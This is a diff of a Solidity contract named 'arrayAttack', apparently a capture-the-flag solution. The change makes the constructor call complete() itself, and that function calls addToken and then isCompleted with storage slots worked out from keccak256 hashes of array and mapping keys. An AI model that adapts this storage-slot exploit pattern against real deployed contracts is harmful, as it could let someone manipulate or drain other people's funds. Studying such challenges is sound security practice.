@@ -9,6 +9,7 @@ contract arrayAttack{
     array arr;
     constructor(address _arr){
         arr = array(_arr);
+        complete();
     }
     function figureArray(uint256 slot)public pure returns(bytes32){
         return keccak256(abi.encodePacked(bytes32(slot)));
@@ -17,7 +18,9 @@ contract arrayAttack{
         return keccak256(abi.encodePacked(bytes32(uint256(uint160(_addr))),bytes32(slot)));
     }
 
-    function complete(address _addr)public{
+    function complete()public{
+        address _addr = address(this);
+        arr.addToken(msg.sender,0);
         arr.isCompleted(figureArray(0),figureMap(1,_addr),0,_addr);
     }
 
